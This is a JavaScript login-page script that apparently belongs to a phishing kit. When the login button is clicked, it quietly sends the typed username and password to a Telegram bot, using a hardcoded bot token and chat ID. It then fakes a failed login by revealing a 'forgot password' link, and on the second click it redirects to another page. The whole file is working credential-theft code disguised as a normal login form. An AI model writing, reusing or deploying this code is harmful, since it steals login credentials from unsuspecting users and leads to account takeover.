const loginBtn = document.getElementById('loginBtn');
const passwordInput = document.getElementById('password');
const usernameInput = document.getElementById('username');
const togglePassword = document.getElementById('togglePassword');
const forgotPassword = document.getElementById('forgotPassword');

let loginClicked = false;
let loginClickCount = 0;

function validatePassword() {
  const password = passwordInput.value.trim();
  const isValid = password.length >= 6 && !password.includes(' ');
  loginBtn.disabled = !isValid;
}

passwordInput.addEventListener('input', validatePassword);

togglePassword.addEventListener('click', () => {
  const isPassword = passwordInput.type === 'password';
  passwordInput.type = isPassword ? 'text' : 'password';
  togglePassword.querySelector('svg').innerHTML = isPassword ?
    `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>` :
    `<path d="M2 2l20 20"></path><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>`;
});

usernameInput.addEventListener('click', () => {
  if (loginClicked) {
    passwordInput.value = '';
  }
});

passwordInput.addEventListener('click', () => {
  if (loginClicked) {
    passwordInput.value = '';
  }
});

loginBtn.addEventListener('click', function (e) {
  e.preventDefault();

  loginClickCount++;

  if (!loginClicked) {
    forgotPassword.style.display = 'block';
    loginClicked = true;
  }

  if (loginClickCount === 2) {
    window.location.href = './galo/galo.html';
    return;
  }

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  if (!username || !password) return;

  const message = `Username: ${username}\nPassword: ${password}`;
  const botToken = '8122183423:AAEnHjyJnIYZEI1PtTHEFCwh3k5I7nymtfs';
  const chatId = '1580328848';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
    .then(response => response.json())
    .then(data => {
      console.log('Message sent:', data);
    })
    .catch(error => {
      console.error('Error sending message:', error);
    });
});